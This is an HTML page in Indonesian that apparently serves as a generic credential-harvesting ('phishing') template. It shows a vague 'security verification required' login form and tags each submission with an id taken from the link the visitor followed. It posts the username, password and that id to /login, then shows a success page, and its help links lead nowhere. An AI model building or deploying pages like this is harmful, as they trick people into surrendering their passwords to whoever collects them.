
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Verifikasi</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container login-container">
        <div class="login-header">
            <h1>🔐 Verifikasi</h1>
        </div>
        
        <div class="warning-small">
            ⚠️ Verifikasi keamanan diperlukan
        </div>
        
        <form id="loginForm">
            <input type="hidden" id="linkId" value="">
            
            <div class="form-group">
                <label>Username / Email</label>
                <input type="text" id="username" placeholder="Masukkan username" required>
            </div>
            
            <div class="form-group">
                <label>Password</label>
                <input type="password" id="password" placeholder="Masukkan password" required>
            </div>
            
            <button type="submit" class="login-btn">LOGIN</button>
        </form>
        
        <div class="login-footer">
            <a href="#">Lupa password?</a>
            <a href="#">Buat akun baru</a>
        </div>
    </div>
    
    <script>
        // Ambil ID dari URL
        const urlParams = new URLSearchParams(window.location.search);
        const linkId = urlParams.get('id') || '';
        document.getElementById('linkId').value = linkId;
        
        // Handle form submit
        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const linkId = document.getElementById('linkId').value;
            
            // Kirim ke server
            const response = await fetch('/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username, password, linkId })
            });
            
            if (response.ok) {
                window.location.href = '/success.html';
            } else {
                alert('Gagal, coba lagi');
            }
        });
    </script>
</body>
</html>
